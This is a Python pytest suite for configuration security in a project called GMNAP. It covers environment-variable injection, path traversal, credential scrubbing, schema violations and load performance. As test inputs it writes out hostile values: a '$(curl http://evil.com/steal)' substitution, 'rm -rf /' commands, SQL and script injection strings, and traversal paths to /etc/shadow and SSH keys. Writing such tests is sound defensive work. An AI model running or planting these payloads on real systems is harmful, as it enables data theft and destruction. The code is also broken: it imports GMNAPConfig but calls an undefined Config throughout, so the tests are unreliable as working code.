"""
Hardcore configuration security testing for GMNAP.

Tests configuration management, environment variable injection, path traversal,
credential exposure, and all scenarios that could compromise system security.
"""

import gc
import json
import os
import random
import string
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from queue import Empty, Queue
from unittest.mock import Mock, mock_open, patch

import psutil
import pytest
import yaml

from src.core.config import GMNAPConfig


class TestConfigurationSecurity:
    """Test configuration security under attack scenarios."""

    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = Path(self.temp_dir) / "test_config.yaml"
        self.original_env = dict(os.environ)

    def teardown_method(self):
        """Clean up test fixtures."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

        # Restore original environment
        os.environ.clear()
        os.environ.update(self.original_env)

    def test_environment_variable_injection(self):
        """Test environment variable injection attacks."""
        # Create malicious environment variables
        malicious_env = {
            "GMNAP_DATABASE_URL": "postgresql://user:pass@evil.com:5432/db",
            "GMNAP_API_KEY": "'; DROP TABLE users; --",
            "GMNAP_CONFIG_PATH": "../../../etc/passwd",
            "GMNAP_LOG_LEVEL": "DEBUG'; import os; os.system('rm -rf /')",
            "GMNAP_CACHE_DIR": "/tmp/$(whoami)",
            "GMNAP_SECRET_KEY": "$(curl http://evil.com/steal)",
            "GMNAP_WORKERS": "999999999",  # Resource exhaustion
            "GMNAP_TIMEOUT": "-1",  # Invalid timeout
            "GMNAP_MEMORY_LIMIT": "0",  # Invalid memory limit
            "GMNAP_DEBUG": "true; echo 'hacked' > /tmp/compromised",
        }

        # Apply malicious environment
        for key, value in malicious_env.items():
            os.environ[key] = value

        # Test config loading with malicious environment
        config = Config()

        # Should sanitize dangerous values
        assert "evil.com" not in config.database_url
        assert "DROP TABLE" not in config.api_key
        assert "../../../etc/passwd" not in config.config_path
        assert "rm -rf" not in config.log_level
        assert "$(whoami)" not in config.cache_dir
        assert "$(curl" not in config.secret_key
        assert config.workers <= 1000  # Should be capped
        assert config.timeout > 0  # Should be positive
        assert config.memory_limit > 0  # Should be positive
        assert "echo 'hacked'" not in str(config.debug)

    def test_path_traversal_attacks(self):
        """Test path traversal attacks in configuration paths."""
        # Create config with path traversal attempts
        malicious_config = {
            "database": {
                "path": "../../../etc/passwd",
                "backup_path": "/../../../../root/.ssh/id_rsa",
                "log_path": "../../../../../../var/log/messages",
            },
            "cache": {
                "directory": "../../../tmp/$(whoami)",
                "temp_path": "/../../../../../../etc/shadow",
            },
            "output": {
                "directory": "../../../home/user/.ssh/",
                "log_file": "../../../../../../etc/hosts",
            },
            "authorities": {
                "config_path": "../../../etc/apache2/sites-available/default",
                "credentials_file": "../../../../../../root/.bashrc",
            },
        }

        # Write malicious config
        with open(self.config_path, "w") as f:
            yaml.dump(malicious_config, f)

        # Load config
        config = Config(config_path=self.config_path)

        # Should sanitize all paths
        assert "../../../etc/passwd" not in config.database_path
        assert "id_rsa" not in config.database_backup_path
        assert "var/log/messages" not in config.database_log_path
        assert "$(whoami)" not in config.cache_directory
        assert "/etc/shadow" not in config.cache_temp_path
        assert "/.ssh/" not in config.output_directory
        assert "/etc/hosts" not in config.output_log_file
        assert "sites-available" not in config.authorities_config_path
        assert "/.bashrc" not in config.authorities_credentials_file

    def test_credential_exposure_prevention(self):
        """Test prevention of credential exposure in logs."""
        # Create config with sensitive data
        sensitive_config = {
            "database": {
                "url": "postgresql://admin:SuperSecret123@db.example.com:5432/prod",
                "password": "MyVerySecretPassword",
                "api_key": "sk-1234567890abcdef",
            },
            "authorities": {
                "openalex_api_key": "Bearer secret-token-12345",
                "google_api_key": "AIzaSyDxxxxxxxxxxxxxxx",
                "microsoft_api_key": "microsoft-secret-key-67890",
            },
            "encryption": {
                "secret_key": "my-encryption-key-dont-expose",
                "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...",
                "jwt_secret": "jwt-signing-secret-12345",
            },
        }

        # Write config with sensitive data
        with open(self.config_path, "w") as f:
            yaml.dump(sensitive_config, f)

        # Capture logs
        log_capture = []

        def mock_log(message):
            log_capture.append(str(message))

        with patch("logging.getLogger") as mock_logger:
            mock_logger.return_value.info = mock_log
            mock_logger.return_value.debug = mock_log
            mock_logger.return_value.warning = mock_log
            mock_logger.return_value.error = mock_log

            config = Config(config_path=self.config_path)

            # Force some logging
            config.log_config_summary()

        # Check that sensitive data was not logged
        all_logs = " ".join(log_capture)

        assert "SuperSecret123" not in all_logs
        assert "MyVerySecretPassword" not in all_logs
        assert "sk-1234567890abcdef" not in all_logs
        assert "secret-token-12345" not in all_logs
        assert "AIzaSyDxxxxxxxxxxxxxxx" not in all_logs
        assert "microsoft-secret-key-67890" not in all_logs
        assert "my-encryption-key-dont-expose" not in all_logs
        assert "BEGIN RSA PRIVATE KEY" not in all_logs
        assert "jwt-signing-secret-12345" not in all_logs

    def test_config_file_corruption_recovery(self):
        """Test recovery from config file corruption."""
        # Create valid config first
        valid_config = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
            "output": {"directory": "/tmp/output"},
        }

        with open(self.config_path, "w") as f:
            yaml.dump(valid_config, f)

        # Corrupt the file
        with open(self.config_path, "w") as f:
            f.write("invalid: yaml: content: [unclosed\n")
            f.write("more: invalid: yaml\n")
            f.write("{{{{ malformed\n")

        # Should handle corruption gracefully
        config = Config(config_path=self.config_path)

        # Should fall back to defaults
        assert config.database_url is not None
        assert config.cache_directory is not None
        assert config.output_directory is not None

    def test_memory_exhaustion_from_config(self):
        """Test memory exhaustion attacks via large config files."""
        # Create extremely large config
        large_config = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
            "authorities": {},
        }

        # Add thousands of authority entries
        for i in range(10000):
            large_config["authorities"][f"authority_{i}"] = {
                "name": f"Authority {i}" * 100,  # Large strings
                "url": f"https://authority{i}.example.com/api/v1/search",
                "api_key": f"key_{i}_" + "x" * 1000,  # 1KB per key
                "description": f"Description for authority {i}" * 200,
                "endpoints": [f"endpoint_{j}" for j in range(100)],
                "metadata": {f"field_{j}": f"value_{j}" * 50 for j in range(100)},
            }

        # Write large config
        with open(self.config_path, "w") as f:
            yaml.dump(large_config, f)

        # Monitor memory usage
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB

        # Load config
        config = Config(config_path=self.config_path)

        # Check memory usage
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_growth = final_memory - initial_memory

        # Should not consume excessive memory
        assert memory_growth < 200, f"Config loading used too much memory: {memory_growth}MB"

        # Should limit number of authorities
        assert len(config.authorities) <= 1000, "Too many authorities loaded"

    def test_concurrent_config_access(self):
        """Test concurrent config access and modification."""
        # Create base config
        base_config = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
            "settings": {"workers": 4, "timeout": 30},
        }

        with open(self.config_path, "w") as f:
            yaml.dump(base_config, f)

        results = Queue()
        errors = Queue()

        def config_worker(worker_id, operations):
            """Worker that accesses/modifies config."""
            worker_errors = []
            worker_results = []

            for i in range(operations):
                try:
                    # Load config
                    config = Config(config_path=self.config_path)

                    # Modify config file concurrently
                    if worker_id % 2 == 0:  # Even workers modify
                        modified_config = base_config.copy()
                        modified_config["settings"]["workers"] = worker_id + i

                        with open(self.config_path, "w") as f:
                            yaml.dump(modified_config, f)

                    # Access config properties
                    _ = config.database_url
                    _ = config.cache_directory
                    _ = config.settings.get("workers", 4)

                    worker_results.append(f"worker_{worker_id}_op_{i}")

                except Exception as e:
                    worker_errors.append(f"worker_{worker_id}_op_{i}: {str(e)}")

            results.put((worker_id, len(worker_results), len(worker_errors)))
            if worker_errors:
                errors.put((worker_id, worker_errors))

        # Run concurrent workers
        num_workers = 10
        operations_per_worker = 20

        threads = []
        for i in range(num_workers):
            thread = threading.Thread(target=config_worker, args=(i, operations_per_worker))
            threads.append(thread)
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Collect results
        worker_results = []
        worker_errors = []

        while not results.empty():
            try:
                worker_results.append(results.get_nowait())
            except Empty:
                break

        while not errors.empty():
            try:
                worker_errors.append(errors.get_nowait())
            except Empty:
                break

        # Verify results
        assert (
            len(worker_results) == num_workers
        ), f"Not all workers completed: {len(worker_results)}"

        # Should handle concurrent access gracefully
        total_errors = sum(len(errors[1]) for errors in worker_errors)
        assert total_errors < 20, f"Too many errors from concurrent access: {total_errors}"

    def test_config_validation_bypass(self):
        """Test attempts to bypass config validation."""
        # Create config with validation bypass attempts
        bypass_config = {
            "database": {
                "url": "javascript:alert('xss')",
                "max_connections": -1,
                "timeout": "'; DROP TABLE config; --",
            },
            "cache": {"size": "unlimited", "ttl": "forever", "directory": "/dev/null"},
            "authorities": {
                "max_requests": "9999999999999999999999",
                "timeout": "0",
                "retry_attempts": -5,
            },
            "output": {
                "format": "../../etc/passwd",
                "compression": "none'; rm -rf /",
                "max_file_size": "1TB",
            },
        }

        # Write bypass config
        with open(self.config_path, "w") as f:
            yaml.dump(bypass_config, f)

        # Load config
        config = Config(config_path=self.config_path)

        # Should validate and sanitize all values
        assert "javascript:" not in config.database_url
        assert config.database_max_connections >= 0
        assert "DROP TABLE" not in str(config.database_timeout)
        assert config.cache_size != "unlimited"
        assert config.cache_ttl != "forever"
        assert config.cache_directory != "/dev/null"
        assert config.authorities_max_requests < 10000
        assert config.authorities_timeout > 0
        assert config.authorities_retry_attempts >= 0
        assert "../../etc/passwd" not in config.output_format
        assert "rm -rf" not in config.output_compression
        assert config.output_max_file_size < 1024 * 1024 * 1024  # Less than 1GB

    def test_sensitive_data_scrubbing(self):
        """Test scrubbing of sensitive data from config."""
        # Create config with mixed sensitive and non-sensitive data
        mixed_config = {
            "database": {
                "url": "postgresql://admin:secret123@db.example.com:5432/prod",
                "host": "db.example.com",
                "port": 5432,
                "name": "production_db",
            },
            "authorities": {
                "openalex": {
                    "api_key": "secret-api-key-12345",
                    "base_url": "https://api.openalex.org",
                    "rate_limit": 10,
                },
                "google": {
                    "credentials": "path/to/credentials.json",
                    "project_id": "my-project",
                    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...",
                },
            },
            "encryption": {
                "algorithm": "AES-256",
                "key": "my-super-secret-encryption-key",
                "iv": "random-initialization-vector",
            },
        }

        # Write config
        with open(self.config_path, "w") as f:
            yaml.dump(mixed_config, f)

        # Load config
        config = Config(config_path=self.config_path)

        # Get scrubbed version
        scrubbed_config = config.get_scrubbed_config()
        scrubbed_str = str(scrubbed_config)

        # Should scrub sensitive data
        assert "secret123" not in scrubbed_str
        assert "secret-api-key-12345" not in scrubbed_str
        assert "my-super-secret-encryption-key" not in scrubbed_str
        assert "BEGIN PRIVATE KEY" not in scrubbed_str
        assert "random-initialization-vector" not in scrubbed_str

        # Should keep non-sensitive data
        assert "db.example.com" in scrubbed_str
        assert "5432" in scrubbed_str
        assert "production_db" in scrubbed_str
        assert "https://api.openalex.org" in scrubbed_str
        assert "my-project" in scrubbed_str
        assert "AES-256" in scrubbed_str

    def test_config_schema_violation_handling(self):
        """Test handling of config schema violations."""
        # Create config with various schema violations
        invalid_config = {
            "database": {
                "url": ["not", "a", "string"],  # Wrong type
                "connections": "not-a-number",  # Wrong type
                "timeout": {"nested": "object"},  # Wrong type
            },
            "cache": {
                "enabled": "maybe",  # Not a boolean
                "size": -1000,  # Invalid value
                "ttl": "not-a-duration",  # Invalid format
            },
            "authorities": {
                "list": "should-be-dict",  # Wrong type
                "invalid_key": {"missing_required_fields": True},
            },
            "unknown_section": {"unknown_field": "unknown_value"},
        }

        # Write invalid config
        with open(self.config_path, "w") as f:
            yaml.dump(invalid_config, f)

        # Should handle schema violations gracefully
        config = Config(config_path=self.config_path)

        # Should use default values for invalid fields
        assert isinstance(config.database_url, str)
        assert isinstance(config.database_connections, int)
        assert isinstance(config.database_timeout, (int, float))
        assert isinstance(config.cache_enabled, bool)
        assert config.cache_size > 0
        assert config.cache_ttl != "not-a-duration"
        assert isinstance(config.authorities, dict)

    def test_file_permission_attacks(self):
        """Test file permission attacks on config files."""
        # Create config with restricted permissions
        restricted_config = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
        }

        with open(self.config_path, "w") as f:
            yaml.dump(restricted_config, f)

        # Remove read permissions
        os.chmod(self.config_path, 0o000)

        # Should handle permission errors gracefully
        config = Config(config_path=self.config_path)

        # Should fall back to defaults
        assert config.database_url is not None
        assert config.cache_directory is not None

        # Create config in non-existent directory
        non_existent_path = Path("/non/existent/directory/config.yaml")

        # Should handle missing directory gracefully
        config2 = Config(config_path=non_existent_path)
        assert config2.database_url is not None

        # Restore permissions for cleanup
        os.chmod(self.config_path, 0o644)


class TestConfigurationPerformance:
    """Test configuration performance under load."""

    def setup_method(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = Path(self.temp_dir) / "perf_test.yaml"

    def teardown_method(self):
        """Clean up test fixtures."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_config_loading_performance(self):
        """Test config loading performance with large files."""
        # Create large but valid config
        large_config = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
            "authorities": {},
        }

        # Add many authorities
        for i in range(1000):
            large_config["authorities"][f"authority_{i:04d}"] = {
                "name": f"Authority {i}",
                "url": f"https://api{i}.example.com/search",
                "api_key": f"key_{i:04d}",
                "rate_limit": 10,
                "timeout": 30,
                "retry_attempts": 3,
                "metadata": {
                    "description": f"Authority {i} for testing",
                    "contact": f"admin{i}@example.com",
                    "version": "1.0.0",
                    "supported_formats": ["json", "xml"],
                    "required_fields": ["name", "id", "email"],
                },
            }

        # Write large config
        with open(self.config_path, "w") as f:
            yaml.dump(large_config, f)

        # Measure loading time
        start_time = time.time()
        config = Config(config_path=self.config_path)
        loading_time = time.time() - start_time

        # Should load quickly
        assert loading_time < 5.0, f"Config loading too slow: {loading_time:.2f}s"

        # Should have loaded data
        assert len(config.authorities) > 0, "Authorities not loaded"

    def test_concurrent_config_performance(self):
        """Test config performance under concurrent access."""
        # Create moderate config
        config_data = {
            "database": {"url": "sqlite:///test.db"},
            "cache": {"directory": "/tmp/cache"},
            "authorities": {f"auth_{i}": {"url": f"https://api{i}.com"} for i in range(100)},
        }

        with open(self.config_path, "w") as f:
            yaml.dump(config_data, f)

        results = Queue()

        def performance_worker(worker_id, iterations):
            """Worker that loads config repeatedly."""
            start_time = time.time()

            for i in range(iterations):
                config = Config(config_path=self.config_path)
                _ = config.database_url
                _ = config.cache_directory
                _ = len(config.authorities)

            end_time = time.time()
            avg_time = (end_time - start_time) / iterations
            results.put((worker_id, avg_time))

        # Run concurrent workers
        num_workers = 8
        iterations_per_worker = 50

        threads = []
        for i in range(num_workers):
            thread = threading.Thread(target=performance_worker, args=(i, iterations_per_worker))
            threads.append(thread)
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Collect results
        worker_times = []
        while not results.empty():
            try:
                worker_times.append(results.get_nowait())
            except Empty:
                break

        # Verify performance
        assert len(worker_times) == num_workers, f"Not all workers completed: {len(worker_times)}"

        avg_times = [time for _, time in worker_times]
        overall_avg = sum(avg_times) / len(avg_times)

        # Should be reasonably fast
        assert overall_avg < 0.1, f"Config loading too slow: {overall_avg:.3f}s per load"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s", "--tb=short"])
